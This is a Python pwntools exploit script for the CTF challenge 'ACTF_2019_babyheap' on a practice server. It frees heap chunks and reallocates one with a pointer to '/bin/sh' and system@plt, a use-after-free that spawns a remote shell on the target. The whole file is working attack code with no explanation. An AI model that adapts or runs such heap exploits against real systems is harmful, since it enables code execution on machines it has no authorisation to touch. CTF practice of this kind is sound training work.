#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/06/07 18:15:37
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 0
context.log_level = 'debug'
context.arch = 'amd64'
if debug:
    sh = process('ACTF_2019_babyheap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    IP = 'node3.buuoj.cn'
    port = 26765
    sh = remote(IP,port)
    libc = ELF('/home/eur1ka/Desktop/Pwn/libc_file/16-64-libc-2.23.so')
elf = ELF('ACTF_2019_babyheap')

binsh_addr = 0x0000000000602010
system_addr = elf.plt['system']

def cmd(choice):
    sh.recvuntil("Your choice: ")
    sh.sendline(str(choice))

def add(size,content):
    cmd(1)
    sh.recvuntil("Please input size: \n")
    sh.sendline(str(size))
    sh.recvuntil("Please input content: ")
    sh.send(content)

def dele(idx):
    cmd(2)
    sh.recvuntil("Please input list index: \n")
    sh.sendline(str(idx))

def show(idx):
    cmd(3)
    sh.recvuntil("Please input list index: \n")
    sh.sendline(str(idx))

add(0x80,"a")
add(0x80,"a")
add(0x80,"a")

dele(1)
dele(0)
payload = p64(binsh_addr) + p64(system_addr)

add(0x10,payload)
show(1)

# sh.recvuntil("\x7f")

sh.interactive()